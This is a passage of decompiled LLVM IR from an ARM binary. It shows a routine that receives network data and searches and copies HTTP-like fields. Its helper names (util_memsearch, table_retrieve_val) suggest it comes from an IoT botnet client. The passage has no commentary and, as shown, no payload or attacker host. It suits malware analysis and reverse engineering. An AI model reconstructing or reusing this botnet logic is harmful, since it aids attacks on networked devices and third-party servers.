  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9868 = load i32, i32* %stack_var_-44, align 4
  %v0_986c = load i32, i32* @r5, align 4
  %v2_986c = add i32 %v0_986c, %v3_9868
  store i32 %v2_986c, i32* @r4, align 4
  store i32 %v2_986c, i32* %r0.global-to-local, align 4
  %v1_9874 = inttoptr i32 %v2_986c to i8*
  %v2_9874 = call i32 @util_strlen(i8* %v1_9874)
  store i32 ptrtoint ([5 x i8]* @global_var_1b414.55 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9874, i32* @r1, align 4
  %v0_9880 = load i32, i32* @r4, align 4
  store i32 %v0_9880, i32* %r0.global-to-local, align 4
  %v4_9884 = inttoptr i32 %v0_9880 to i8*
  %v5_9884 = call i32 @util_stristr(i8* %v4_9884, i32 %v2_9874, i32 ptrtoint ([5 x i8]* @global_var_1b414.55 to i32))
  store i32 %v5_9884, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_988c = load i32, i32* %stack_var_-44, align 4
  %v2_9890 = add i32 %v3_988c, %v5_9884
  store i32 %v2_9890, i32* %ip.global-to-local, align 4
  store i32 %v2_9890, i32* %stack_var_-44, align 4
  br label %dec_label_pc_9898

dec_label_pc_9898:                                ; preds = %.thread38, %dec_label_pc_9864
  %v0_9d74 = phi i32 [ %v4_985c, %.thread38 ], [ %v2_9890, %dec_label_pc_9864 ]
  %v0_9898 = load i32, i32* @r5, align 4
  %v2_9898 = add i32 %v0_9898, %v0_9d74
  %v3_9898 = inttoptr i32 %v2_9898 to i8*
  %v4_9898 = load i8, i8* %v3_9898, align 1
  %v6_9898 = zext i8 %v4_9898 to i32
  store i32 %v6_9898, i32* %r3.global-to-local, align 4
  %v2_989c = icmp ugt i8 %v4_9898, 33
  store i1 %v2_989c, i1* %cpsr_c.global-to-local, align 1
  %v7_989c = icmp eq i8 %v4_9898, 34
  store i1 %v7_989c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_989c, label %dec_label_pc_9d74, label %dec_label_pc_98a4

dec_label_pc_98a4:                                ; preds = %dec_label_pc_9d74, %dec_label_pc_9898, %dec_label_pc_9d9c
  %v0_98a4 = load i32, i32* @r5, align 4
  store i32 %v0_98a4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_98ac = inttoptr i32 %v0_98a4 to i8*
  %v3_98ac = call i32 @util_atoi(i8* %v2_98ac, i32 10)
  store i32 %v3_98ac, i32* %r0.global-to-local, align 4
  %v1_98b0 = add i32 %v3_98ac, -1
  store i32 %v1_98b0, i32* %r3.global-to-local, align 4
  %v2_98b4 = icmp ugt i32 %v1_98b0, 7
  store i1 %v2_98b4, i1* %cpsr_c.global-to-local, align 1
  %v7_98b4 = icmp eq i32 %v1_98b0, 8
  store i1 %v7_98b4, i1* %cpsr_z.global-to-local, align 1
  %v2_98b8 = xor i1 %v2_98b4, true
  %v3_98b8 = or i1 %v7_98b4, %v2_98b8
  br i1 %v3_98b8, label %dec_label_pc_98cc.preheader, label %dec_label_pc_98e0

dec_label_pc_98cc.preheader:                      ; preds = %dec_label_pc_98a4
  store i32 %v2_879c, i32* %r2.global-to-local, align 4
  %v6_98bc = add i32 %v3_98ac, %v2_879c
  store i32 %v6_98bc, i32* @r4, align 4
  br label %dec_label_pc_98cc

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98cc
  %v1_98c8 = call i32 @sleep(i32 1)
  store i32 %v1_98c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98cc

dec_label_pc_98cc:                                ; preds = %dec_label_pc_98cc.preheader, %dec_label_pc_98c8
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_98d0 = call i32 @__GI_time(i32* null)
  %v0_98d4 = load i32, i32* @r4, align 4
  %v3_98d4 = icmp uge i32 %v0_98d4, %v2_98d0
  store i1 %v3_98d4, i1* %cpsr_c.global-to-local, align 1
  %v9_98d4 = icmp eq i32 %v0_98d4, %v2_98d0
  store i1 %v9_98d4, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_98dc = xor i1 %v9_98d4, true
  %v3_98dc = and i1 %v3_98d4, %v2_98dc
  br i1 %v3_98dc, label %dec_label_pc_98c8, label %dec_label_pc_98e0

dec_label_pc_98e0:                                ; preds = %dec_label_pc_98cc, %dec_label_pc_98a4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_98e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98e4, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  %v2_98e8 = add i32 %v0_98e8, %v3_98e4
  store i32 %v2_98e8, i32* @r6, align 4
  store i32 %v2_98e8, i32* %r0.global-to-local, align 4
  %v1_98f0 = inttoptr i32 %v2_98e8 to i8*
  %v2_98f0 = call i32 @util_strlen(i8* %v1_98f0)
  store i32 ptrtoint ([5 x i8]* @global_var_1b40c.53 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_98f0, i32* @r1, align 4
  %v0_98fc = load i32, i32* @r6, align 4
  store i32 %v0_98fc, i32* %r0.global-to-local, align 4
  %v4_9900 = inttoptr i32 %v0_98fc to i8*
  %v5_9900 = call i32 @util_stristr(i8* %v4_9900, i32 %v2_98f0, i32 ptrtoint ([5 x i8]* @global_var_1b40c.53 to i32))
  store i32 %v5_9900, i32* %r0.global-to-local, align 4
  %v2_9904 = icmp ugt i32 %v5_9900, 3
  store i1 %v2_9904, i1* %cpsr_c.global-to-local, align 1
  %v7_9904 = icmp eq i32 %v5_9900, 4
  store i1 %v7_9904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9904, label %dec_label_pc_9c60, label %dec_label_pc_990c

dec_label_pc_990c:                                ; preds = %dec_label_pc_98e0
  %v0_990c = load i32, i32* @r5, align 4
  %v1_990c = load i32, i32* @r4, align 4
  %v2_990c = add i32 %v1_990c, %v0_990c
  %v3_990c = inttoptr i32 %v2_990c to i8*
  %v4_990c = load i8, i8* %v3_990c, align 1
  %v6_990c = zext i8 %v4_990c to i32
  store i32 %v6_990c, i32* @r3, align 4
  %v2_9910 = icmp ugt i8 %v4_990c, 46
  store i1 %v2_9910, i1* %cpsr_c.global-to-local, align 1
  %v7_9910 = icmp eq i8 %v4_990c, 47
  store i1 %v7_9910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9910, label %dec_label_pc_9dbc, label %dec_label_pc_9918

dec_label_pc_9918:                                ; preds = %dec_label_pc_9dd8, %dec_label_pc_9dbc, %dec_label_pc_9d24, %dec_label_pc_9d08, %dec_label_pc_990c, %dec_label_pc_9e04, %dec_label_pc_9d50
  %v0_9918 = load i32, i32* %sb.global-to-local, align 4
  %v1_991c = add i32 %v0_9918, 1431
  store i32 %v1_991c, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b3e8.30 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_9928 = call i32 @memcpy()
  store i32 %v0_9928, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_9930 = load i32, i32* @sl, align 4
  %v3_9930 = add i32 %v2_9930, -1448
  %v4_9930 = inttoptr i32 %v3_9930 to i8*
  store i8 10, i8* %v4_9930, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9938:                                ; preds = %dec_label_pc_9804, %dec_label_pc_9744, %dec_label_pc_9718
  %v0_9938 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9938, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b400.51 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v5_9948 = call i32 @util_memsearch(i32 %v2_827c, i32 %v0_9938, i32 ptrtoint ([5 x i8]* @global_var_1b400.51 to i32), i32 4)
  %v0_994c = load i32, i32* %sb.global-to-local, align 4
  %v1_9950 = add i32 %v0_994c, 1431
  store i32 %v1_9950, i32* @r4, align 4
  store i32 %v5_9948, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b41c.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_9950, i32* %r0.global-to-local, align 4
  %v3_9960 = inttoptr i32 %v1_9950 to i8*
  %v4_9960 = call i32 @util_strcmp(i8* %v3_9960, i32 ptrtoint ([5 x i8]* @global_var_1b41c.57 to i32))
  store i32 %v4_9960, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9964 = icmp eq i32 %v4_9960, 0
  store i1 %v2_9964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9964, label %dec_label_pc_9b14, label %dec_label_pc_996c

dec_label_pc_996c:                                ; preds = %dec_label_pc_9b14, %dec_label_pc_9938
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_9970 = load i32, i32* @sl, align 4
  %v3_9970 = add i32 %v2_9970, -1448
  %v4_9970 = inttoptr i32 %v3_9970 to i8*
  store i8 7, i8* %v4_9970, align 1
  br label %dec_label_pc_9974

dec_label_pc_9974:                                ; preds = %bb211, %dec_label_pc_996c
  %v0_9974 = load i32, i32* @r5, align 4
  store i32 %v0_9974, i32* %r2.global-to-local, align 4
  %v0_9978 = load i32, i32* @sl, align 4
  %v1_9978 = add i32 %v0_9978, -1452
  %v2_9978 = inttoptr i32 %v1_9978 to i32*
  %v3_9978 = load i32, i32* %v2_9978, align 4
  store i32 %v3_9978, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9984 = call i32 @__libc_recv(i32 %v3_9978, i32 %v2_827c, i32 %v0_9974, i32 16384)
  store i32 %v4_9984, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87ec

dec_label_pc_998c:                                ; preds = %dec_label_pc_8e94
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_9994 = load i32, i32* @sl, align 4
  %v1_9994 = add i32 %v0_9994, 660
  %v2_9994 = inttoptr i32 %v1_9994 to i32*
  %v3_9994 = load i32, i32* %v2_9994, align 4
  store i32 %v3_9994, i32* @r4, align 4
  %v3_9998 = call i32 @table_retrieve_val(i32 36, i32* null)
  %v0_999c = load i32, i32* @r4, align 4
  store i32 %v0_999c, i32* %r1.global-to-local, align 4
  store i32 %v3_9998, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_99a8 = load i32, i32* @r7, align 4
  store i32 %v0_99a8, i32* %r0.global-to-local, align 4
  %v4_99ac = call i32 @util_memsearch(i32 %v0_99a8, i32 %v0_999c, i32 %v3_9998, i32 11)
  store i32 %v4_99ac, i32* %r0.global-to-local, align 4
  %v0_99b0 = load i32, i32* @sl, align 4
  %v1_99b0 = add i32 %v0_99b0, 660
  %v2_99b0 = inttoptr i32 %v1_99b0 to i32*
  %v3_99b0 = load i32, i32* %v2_99b0, align 4
  %v0_99b4 = load i32, i32* @r7, align 4
  %v2_99b4 = add i32 %v0_99b4, %v4_99ac
  store i32 %v2_99b4, i32* @r6, align 4
  store i32 %v4_99ac, i32* @r4, align 4
  %v2_99bc = sub i32 %v3_99b0, %v4_99ac
  store i32 %v2_99bc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b424.59 to i32), i32* %r2.global-to-local, align 4
  %v0_99c4 = load i32, i32* @r8, align 4
  store i32 %v0_99c4, i32* %r3.global-to-local, align 4
  store i32 %v2_99b4, i32* %r0.global-to-local, align 4
  %v4_99cc = call i32 @util_memsearch(i32 %v2_99b4, i32 %v2_99bc, i32 ptrtoint (i32* @global_var_1b424.59 to i32), i32 %v0_99c4)
  store i32 %v4_99cc, i32* %r0.global-to-local, align 4
  %v0_99d0 = load i32, i32* @sl, align 4
  %v1_99d0 = add i32 %v0_99d0, 16
  %v2_99d0 = inttoptr i32 %v1_99d0 to i32*
  %v3_99d0 = load i32, i32* %v2_99d0, align 4
  store i32 %v3_99d0, i32* %r3.global-to-local, align 4
  %v1_99d4 = load i32, i32* @r4, align 4
  %v2_99d4 = add i32 %v1_99d4, %v4_99cc
  store i32 %v2_99d4, i32* @r5, align 4
  %v0_99d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_99d8 = add i32 %v0_99d8, %v2_99d4
  store i32 %v2_99d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_99e0 = icmp ugt i32 %v3_99d0, 3
  store i1 %v2_99e0, i1* %cpsr_c.global-to-local, align 1
  %v7_99e0 = icmp eq i32 %v3_99d0, 4
  store i1 %v7_99e0, i1* %cpsr_z.global-to-local, align 1
  %v3_99e4 = add i32 %v2_99d8, 2115
  %v4_99e4 = inttoptr i32 %v3_99e4 to i8*
  store i8 0, i8* %v4_99e4, align 1
  %v7_99e8 = icmp sgt i32 %v3_99d0, 4
  br i1 %v7_99e8, label %dec_label_pc_99ec, label %dec_label_pc_9b54

dec_label_pc_99ec:                                ; preds = %dec_label_pc_998c, %dec_label_pc_9b54, %dec_label_pc_9b64
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_99f4 = load i32, i32* @sl, align 4
  %v2_99f4 = add i32 %v1_99f4, 12
  %v3_99f4 = inttoptr i32 %v2_99f4 to i32*
  store i32 -1, i32* %v3_99f4, align 4
  %v0_99f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_99f8 = trunc i32 %v0_99f8 to i8
  %v2_99f8 = load i32, i32* @sl, align 4
  %v3_99f8 = add i32 %v2_99f8, -1448
  %v4_99f8 = inttoptr i32 %v3_99f8 to i8*
  store i8 %v1_99f8, i8* %v4_99f8, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9a00:                                ; preds = %bb201
  store i32 7, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9a0c = load i32, i32* @r6, align 4
  %v1_9a0c = add i32 %v0_9a0c, 4
  %v2_9a0c = inttoptr i32 %v1_9a0c to i8*
  %v3_9a0c = load i8, i8* %v2_9a0c, align 1
  %v4_9a0c = zext i8 %v3_9a0c to i32
  store i32 %v4_9a0c, i32* @r3, align 4
  %v2_9a10 = icmp ugt i8 %v3_9a0c, 114
  store i1 %v2_9a10, i1* %cpsr_c.global-to-local, align 1
  %v7_9a10 = icmp eq i8 %v3_9a0c, 115
  store i1 %v7_9a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a10, label %bb206, label %.thread41

bb206:                                            ; preds = %dec_label_pc_9a00
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_9a00, %bb206
  %v3_9a20 = phi i32 [ 7, %dec_label_pc_9a00 ], [ 8, %bb206 ]
  store i32 %v0_9a0c, i32* @r0, align 4
  %v1_9a28 = load i32, i32* @r5, align 4
  %v2_9a28 = sub i32 %v1_9a28, %v3_9a20
  store i32 %v2_9a28, i32* @r2, align 4
  %v2_9a2c = add i32 %v3_9a20, %v0_9a0c
  store i32 %v2_9a2c, i32* @r1, align 4
  %v3_9a30 = call i32 @memmove(i32 %v0_9a0c, i32 %v2_9a2c, i32 %v2_9a28)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v0_9a38 = load i32, i32* @r7, align 4
  store i32 %v0_9a38, i32* %stack_var_-44, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v1_9a40 = load i32, i32* @r4, align 4
  %v2_9a40 = add i32 %v1_9a40, %v2_827c
  %v3_9a40 = inttoptr i32 %v2_9a40 to i8*
  %v4_9a40 = load i8, i8* %v3_9a40, align 1
  %v6_9a40 = zext i8 %v4_9a40 to i32
  store i32 %v6_9a40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a44 = icmp eq i8 %v4_9a40, 0
  store i1 %v2_9a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a44, label %dec_label_pc_9a88, label %dec_label_pc_9a4c

dec_label_pc_9a4c:                                ; preds = %.thread41
  %v2_9a4c = icmp ugt i8 %v4_9a40, 46
  store i1 %v2_9a4c, i1* %cpsr_c.global-to-local, align 1
  %v7_9a4c = icmp eq i8 %v4_9a40, 47
  store i1 %v7_9a4c, i1* %cpsr_z.global-to-local, align 1
  %v1_9a50 = load i32, i32* @r6, align 4
  br i1 %v7_9a4c, label %bb207, label %dec_label_pc_9a58

bb207:                                            ; preds = %dec_label_pc_9a4c
  store i32 %v1_9a50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9b48

dec_label_pc_9a58:                                ; preds = %dec_label_pc_9a4c
  store i32 %v0_9a38, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9a68

dec_label_pc_9a60:                                ; preds = %dec_label_pc_9a68
  %v2_9a60 = icmp ugt i8 %v4_9a74, 46
  store i1 %v2_9a60, i1* %cpsr_c.global-to-local, align 1
  %v7_9a60 = icmp eq i8 %v4_9a74, 47
  store i1 %v7_9a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a60, label %dec_label_pc_9b48, label %dec_label_pc_9a68

dec_label_pc_9a68:                                ; preds = %dec_label_pc_9a60, %dec_label_pc_9a58
  %v0_9a68 = phi i32 [ %v1_9a68, %dec_label_pc_9a60 ], [ %v0_9a38, %dec_label_pc_9a58 ]
  %v1_9a68 = add i32 %v0_9a68, 1
  store i32 %v1_9a68, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_9a68, i32* %stack_var_-44, align 4
  %v2_9a74 = add i32 %v1_9a68, %v1_9a50
  %v3_9a74 = inttoptr i32 %v2_9a74 to i8*
  %v4_9a74 = load i8, i8* %v3_9a74, align 1
  %v6_9a74 = zext i8 %v4_9a74 to i32
  store i32 %v6_9a74, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a78 = icmp eq i8 %v4_9a74, 0
  store i1 %v2_9a78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9a68, i32* %r1.global-to-local, align 4
  store i32 %v2_9a74, i32* %r2.global-to-local, align 4
  br i1 %v2_9a78, label %dec_label_pc_9a88, label %dec_label_pc_9a60

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9a68, %.thread41, %dec_label_pc_9b48
  %v0_9a88 = load i32, i32* @r6, align 4
  store i32 %v0_9a88, i32* %r0.global-to-local, align 4
  %v1_9a8c = inttoptr i32 %v0_9a88 to i8*
  %v2_9a8c = call i32 @util_strlen(i8* %v1_9a8c)
  store i32 %v2_9a8c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a90 = icmp eq i32 %v2_9a8c, 0
  store i1 %v2_9a90, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v2_9a8c, 1
  br i1 %tmp208, label %dec_label_pc_9ab4, label %dec_label_pc_9a98

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a88
  %v0_9a98 = load i32, i32* @r6, align 4
  store i32 %v0_9a98, i32* %r0.global-to-local, align 4
  %v1_9a9c = inttoptr i32 %v0_9a98 to i8*
  %v2_9a9c = call i32 @util_strlen(i8* %v1_9a9c)
  store i32 %v2_9a9c, i32* %r0.global-to-local, align 4
  %v1_9aa0 = add i32 %v2_9a9c, -127
  %v2_9aa0 = icmp ugt i32 %v2_9a9c, 126
  store i1 %v2_9aa0, i1* %cpsr_c.global-to-local, align 1
  %v3_9aa0 = sub i32 126, %v2_9a9c
  %v4_9aa0 = and i32 %v3_9aa0, %v2_9a9c
  %v5_9aa0 = icmp slt i32 %v4_9aa0, 0
  %v6_9aa0 = icmp slt i32 %v1_9aa0, 0
  %v7_9aa0 = icmp eq i32 %v2_9a9c, 127
  store i1 %v7_9aa0, i1* %cpsr_z.global-to-local, align 1
  %v7_9aa4 = icmp sgt i32 %v2_9a9c, 127
  br i1 %v7_9aa4, label %.thread44, label %bb209

bb209:                                            ; preds = %dec_label_pc_9a98
  %v8_9aa4 = load i32, i32* %sb.global-to-local, align 4
  %v9_9aa8 = add i32 %v8_9aa4, 789
  store i32 %v9_9aa8, i32* %r0.global-to-local, align 4
  %v8_9aac = load i32, i32* @r6, align 4
  store i32 %v8_9aac, i32* %r1.global-to-local, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_9a98, %bb209
  store i32 39604, i32* @lr, align 4
  %v3_9ab0 = xor i1 %v6_9aa0, %v5_9aa0
  %v4_9ab0 = or i1 %v7_9aa0, %v3_9ab0
  call void @__pseudo_cond_branch(i1 %v4_9ab0, i32 ptrtoint (i32* @global_var_122cc.60 to i32))
  br label %dec_label_pc_9ab4

dec_label_pc_9ab4:                                ; preds = %dec_label_pc_9a88, %.thread44
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9ab8 = load i32, i32* %stack_var_-44, align 4
  %v0_9abc = load i32, i32* @r6, align 4
  %v1_9abc = add i32 %v0_9abc, 1
  store i32 %v1_9abc, i32* @r5, align 4
  %v2_9ac0 = add i32 %v1_9abc, %v3_9ab8
  store i32 %v2_9ac0, i32* %r0.global-to-local, align 4
  %v1_9ac4 = inttoptr i32 %v2_9ac0 to i8*
  %v2_9ac4 = call i32 @util_strlen(i8* %v1_9ac4)
  store i32 %v2_9ac4, i32* %r0.global-to-local, align 4
  %v2_9ac8 = icmp ugt i32 %v2_9ac4, 254
  store i1 %v2_9ac8, i1* %cpsr_c.global-to-local, align 1
  %v7_9ac8 = icmp eq i32 %v2_9ac4, 255
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  %v8_9acc = icmp sgt i32 %v2_9ac4, 255
  br i1 %v8_9acc, label %dec_label_pc_9654, label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ab4
  %v0_9ad0 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ad4 = add i32 %v0_9ad0, 533
  store i32 %v1_9ad4, i32* @r4, align 4
  store i32 %v1_9ad4, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9ae0 = call i32 @util_zero(i32 %v1_9ad4, i32 255)
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v3_9ae8 = load i32, i32* %stack_var_-44, align 4
  %v0_9aec = load i32, i32* @r5, align 4
  %v2_9aec = add i32 %v0_9aec, %v3_9ae8
  store i32 %v2_9aec, i32* %r0.global-to-local, align 4
  %v1_9af0 = inttoptr i32 %v2_9aec to i8*
  %v2_9af0 = call i32 @util_strlen(i8* %v1_9af0)
  store i32 %v2_9af0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9af4 = icmp eq i32 %v2_9af0, 0
  store i1 %v2_9af4, i1* %cpsr_z.global-to-local, align 1
  %tmp210 = icmp slt i32 %v2_9af0, 1
  br i1 %tmp210, label %dec_label_pc_9654, label %dec_label_pc_9afc

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9ad0
  %v3_9b00 = load i32, i32* %stack_var_-44, align 4
  %v0_9b04 = load i32, i32* @r4, align 4
  store i32 %v0_9b04, i32* @r0, align 4
  %v0_9b08 = load i32, i32* @r5, align 4
  %v2_9b08 = add i32 %v0_9b08, %v3_9b00
  store i32 %v2_9b08, i32* %r1.global-to-local, align 4
  %v2_9b0c = inttoptr i32 %v0_9b04 to i8*
  %v3_9b0c = call i32 @util_strcpy(i8* %v2_9b0c, i32 %v2_9b08)
  store i32 %v3_9b0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9654

dec_label_pc_9b14:                                ; preds = %dec_label_pc_9938
  %v0_9b14 = load i32, i32* @r4, align 4
  store i32 %v0_9b14, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b3e8.30 to i32), i32* %r1.global-to-local, align 4
  %v3_9b1c = inttoptr i32 %v0_9b14 to i8*
  %v4_9b1c = call i32 @util_strcmp(i8* %v3_9b1c, i32 ptrtoint ([4 x i8]* @global_var_1b3e8.30 to i32))
  store i32 %v4_9b1c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9b20 = icmp eq i32 %v4_9b1c, 0
  store i1 %v2_9b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9b20, label %bb211, label %dec_label_pc_996c

bb211:                                            ; preds = %dec_label_pc_9b14
  %v0_9b28 = load i32, i32* %fp.global-to-local, align 4
  %v1_9b28 = load i32, i32* @r5, align 4
  %v3_9b28 = icmp uge i32 %v0_9b28, %v1_9b28
  store i1 %v3_9b28, i1* %cpsr_c.global-to-local, align 1
  %v9_9b28 = icmp eq i32 %v0_9b28, %v1_9b28
  store i1 %v9_9b28, i1* %cpsr_z.global-to-local, align 1
  %v7_9b2c = icmp sgt i32 %v0_9b28, %v1_9b28
  %. = select i1 %v7_9b2c, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9b34 = trunc i32 %. to i8
  %v10_9b34 = load i32, i32* @sl, align 4
  %v11_9b34 = add i32 %v10_9b34, -1448
  %v12_9b34 = inttoptr i32 %v11_9b34 to i8*
  store i8 %v9_9b34, i8* %v12_9b34, align 1
  br label %dec_label_pc_9974

dec_label_pc_9b40:                                ; preds = %dec_label_pc_8f38
  %v0_9b40 = load i32, i32* @r4, align 4
  %v1_9b40 = trunc i32 %v0_9b40 to i8
  %v2_9b40 = load i32, i32* @sl, align 4
  %v3_9b40 = add i32 %v2_9b40, -1448
  %v4_9b40 = inttoptr i32 %v3_9b40 to i8*
  store i8 %v1_9b40, i8* %v4_9b40, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9b48:                                ; preds = %dec_label_pc_9a60, %bb207
  %v2_9b4c = phi i32 [ %v1_9a50, %bb207 ], [ %v2_9a74, %dec_label_pc_9a60 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9b4c = inttoptr i32 %v2_9b4c to i8*
  store i8 0, i8* %v3_9b4c, align 1
  br label %dec_label_pc_9a88

dec_label_pc_9b54:                                ; preds = %dec_label_pc_998c
  %v0_9b54 = load i32, i32* @r6, align 4
  store i32 %v0_9b54, i32* %r0.global-to-local, align 4
  %v1_9b58 = inttoptr i32 %v0_9b54 to i8*
  %v2_9b58 = call i32 @util_strlen(i8* %v1_9b58)
  store i32 %v2_9b58, i32* %r0.global-to-local, align 4
  %v2_9b5c = icmp ugt i32 %v2_9b58, 126
  store i1 %v2_9b5c, i1* %cpsr_c.global-to-local, align 1
  %v7_9b5c = icmp eq i32 %v2_9b58, 127
  store i1 %v7_9b5c, i1* %cpsr_z.global-to-local, align 1
  %v8_9b60 = icmp sgt i32 %v2_9b58, 127
  br i1 %v8_9b60, label %dec_label_pc_99ec, label %dec_label_pc_9b64

dec_label_pc_9b64:                                ; preds = %dec_label_pc_9b54
  %v0_9b64 = load i32, i32* @sl, align 4
  %v1_9b64 = add i32 %v0_9b64, 16
  %v2_9b64 = inttoptr i32 %v1_9b64 to i32*
  %v3_9b64 = load i32, i32* %v2_9b64, align 4
  %v1_9b68 = and i32 %v3_9b64, 33554432
  %v2_9b68 = icmp ne i32 %v1_9b68, 0
  store i1 %v2_9b68, i1* %cpsr_c.global-to-local, align 1
  %v3_9b68 = mul i32 %v3_9b64, 128
  %v1_9b6c = add i32 %v3_9b68, 1472
  %v0_9b70 = load i32, i32* @r6, align 4
  store i32 %v0_9b70, i32* %r1.global-to-local, align 4
  %v0_9b74 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b74 = add i32 %v1_9b6c, %v0_9b74
  store i32 %v2_9b74, i32* @r0, align 4
  %v2_9b78 = inttoptr i32 %v2_9b74 to i8*
  %v3_9b78 = call i32 @util_strcpy(i8* %v2_9b78, i32 %v0_9b70)
  store i32 %v3_9b78, i32* %r0.global-to-local, align 4
  %v0_9b7c = load i32, i32* @sl, align 4
  %v1_9b7c = add i32 %v0_9b7c, 16
  %v2_9b7c = inttoptr i32 %v1_9b7c to i32*
  %v3_9b7c = load i32, i32* %v2_9b7c, align 4
  %v1_9b80 = and i32 %v3_9b7c, 33554432
  %v2_9b80 = icmp ne i32 %v1_9b80, 0
  store i1 %v2_9b80, i1* %cpsr_c.global-to-local, align 1
  %v3_9b80 = mul i32 %v3_9b7c, 128
  %v1_9b84 = add i32 %v3_9b80, 1472
  %v0_9b88 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b88 = add i32 %v1_9b84, %v0_9b88
  store i32 %v2_9b88, i32* @r4, align 4
  store i32 %v2_9b88, i32* %r0.global-to-local, align 4
  %v1_9b90 = inttoptr i32 %v2_9b88 to i8*
  %v2_9b90 = call i32 @util_strlen(i8* %v1_9b90)
  store i32 ptrtoint (i32* @global_var_1b428.62 to i32), i32* %r1.global-to-local, align 4
  %v0_9b98 = load i32, i32* @r4, align 4
  %v2_9b98 = add i32 %v0_9b98, %v2_9b90
  store i32 %v2_9b98, i32* @r0, align 4
  %v2_9b9c = inttoptr i32 %v2_9b98 to i8*
  %v3_9b9c = call i32 @util_strcpy(i8* %v2_9b9c, i32 ptrtoint (i32* @global_var_1b428.62 to i32))
  store i32 %v3_9b9c, i32* %r0.global-to-local, align 4
  %v0_9ba0 = load i32, i32* @r5, align 4
  %v1_9ba0 = add i32 %v0_9ba0, 3
